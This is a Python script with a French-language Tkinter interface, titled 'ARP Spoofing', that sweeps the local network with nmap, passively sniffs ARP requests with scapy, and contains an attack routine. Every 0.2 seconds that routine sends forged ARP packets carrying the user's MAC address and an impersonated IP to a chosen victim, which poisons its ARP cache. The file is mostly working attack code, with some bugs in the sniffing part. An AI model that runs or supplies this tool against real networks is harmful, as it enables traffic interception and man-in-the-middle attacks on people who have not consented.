import tkinter as tk
import nmap
import netifaces
from scapy.all import *
import time
import threading
from scapy.all import sniff
from tkinter import ttk


global liste_pas

liste_pas = []
global is_sniffing
is_sniffing=False






# Define a function to process captured packets
def packet_handler(packet):
    global liste_pas
    if packet[ARP].op == 1:  # ARP request
        src_ip = packet[ARP].psrc
        src_mac = packet[ARP].hwsrc
        if (src_ip, src_mac) not in liste:
            liste_pas.append((src_ip, src_mac))
            print(f"IP: {src_ip}, MAC: {src_mac}")
            liste_ip_1.insert(tk.END, f"IP: {src_ip}, MAC: {src_mac}")
 
# Sniff only TCP packets on the default network interface


def stop_passive():
    global is_sniffing
    is_sniffing = False


def passive():
    global is_sniffing
    is_sniffing = True
    def snif():
        while is_sniffing:
              sniff(filter='arp', prn=packet_handler)
    thread = threading.Thread(target=snif)
    thread.start()



def get_interface_info():
    info = []
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface == "lo":
            continue
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            address_info = addresses[netifaces.AF_INET][0]
            ip_address = address_info['addr']
            netmask = address_info['netmask']
            info += [[ip_address , netmask]]
    return info

def scan():
    index = liste_if.curselection()
    b = liste_if.get(index[0])
    a = decimal_to_cidr(b[0], b[1])
    liste = []
    nm = nmap.PortScanner()
    nm.scan(hosts=a, arguments='-sP')
    for host in nm.all_hosts():
        liste.append(str(host)  +' '+  str(nm[host].hostname()))
    progressbar.step(20)

    for ip in liste:
        liste_ip_1.insert(tk.END, ip)

def start_scan():
    scan_thread = threading.Thread(target=scan)
    scan_thread.start()




def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac


def decimal_to_cidr(ip, masque):
    ip_octets = [int(octet) for octet in ip.split('.')]
    masque_octets = [int(octet) for octet in masque.split('.')]
    bits_a_un = sum([bin(octet).count('1') for octet in masque_octets])

    cidr = f"{ip}/{bits_a_un}"

    return cidr

is_sending = False



def attack():
    global is_sending
    is_sending = True
    def send_packet():
        my_mac = get_mac_address()
        packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=ip_1.get(), pdst=ip_2.get())
        while is_sending:
            time.sleep(0.2)
            sendp(packet,verbose=False)
    thread = threading.Thread(target=send_packet)
    thread.start()



def stop_attack():
    global is_sending
    is_sending = False

liste = []
fenetre = tk.Tk()
fenetre.title("ARP Spoofing")

label_0 = tk.Label(fenetre, text="Adresse IP à imiter :")
label_0.grid(row=0, column=0, padx=10, pady=5)

liste_ip_1 = tk.Listbox(fenetre, width=70,height=20,selectmode=tk.SINGLE)


for ip in liste:
    liste_ip_1.insert(tk.END, ip)
liste_ip_1.grid(row=0, column=0, padx=10, pady=5,sticky=tk.NSEW)
scrollbar = tk.Scrollbar(fenetre, orient=tk.VERTICAL,command=liste_ip_1.yview)
scrollbar.grid(row=0,column=1,sticky=tk.NS)


label_1 = tk.Label(fenetre, text="IP à imiter :")
label_1.grid(row=0, column=5, padx=10, pady=5)

ip_1 = tk.Entry(fenetre)
ip_1.grid(row=0, column=6, padx=1, pady=5)

label_2 = tk.Label(fenetre, text="IP à attaquer :")
label_2.grid(row=1, column=6, padx=10, pady=5)
ip_2 = tk.Entry(fenetre)
ip_2.grid(row=1, column=7, padx=10, pady=5)

bouton_lancer = tk.Button(fenetre, text="Lancer l'attaque", command=attack)
bouton_lancer.grid(row=2, columnspan=2, padx=10, pady=10)
listeif=get_interface_info()
liste_if = tk.Listbox(fenetre, selectmode=tk.SINGLE)
for inf in listeif:
    liste_if.insert(tk.END, inf)
liste_if.grid(row=3, column=0, padx=10, pady=5)

button_scan = tk.Button(fenetre, text="Lancer le scan", command=start_scan)
button_scan.grid(row=5, column=0, columnspan=2, padx=10, pady=10)

button_stop = tk.Button(fenetre, text="Arreter l'attaque", command=stop_attack)
button_stop.grid(row=6, column=0, columnspan=2, padx=10, pady=10)

button_pass = tk.Button(fenetre, text="Lancer le scan passive", command=passive)
button_pass.grid(row=7, column=0, columnspan=2, padx=10, pady=10)

button_stop_pass = tk.Button(fenetre, text="stop scan passive", command=stop_passive)
button_stop_pass.grid(row=8, column=0, columnspan=2, padx=10, pady=10)



fenetre.mainloop()
